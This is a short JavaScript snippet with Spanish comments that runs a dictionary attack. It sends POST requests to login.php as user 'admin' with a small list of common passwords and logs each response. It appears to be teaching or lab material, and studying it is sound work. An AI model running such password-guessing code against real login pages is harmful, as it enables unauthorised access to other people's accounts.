// Se define el nombre de usuario que se intentará usar en el ataque
const usuario = 'admin';
// Lista de posibles contraseñas a probar (ataque por diccionario)
const posiblesPasswords = ['123', 'admin', '123456', 'password', 'qwerty'];

// Bucle que recorre cada contraseña en la lista
for (let pass of posiblesPasswords) {

    // Se hace una solicitud POST al archivo login.php
    fetch('login.php', {
        method: 'POST', // Metodo HTTP POST se usará para enviar datos al server
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, // Tipo de contenido, como en un formulario HTML
        body: `usuario=${usuario}&password=${pass}` // Cuerpo del mensaje
        //con los datos del usuario y la contraseña actual
    })

    // Cuando se recibe la respuesta, se convierte a texto
    .then(res => res.text())

    // Se muestran las respuestas del servidor
    .then(respuesta => {
        console.log(`Probando ${pass}: ${respuesta}`);
    });
}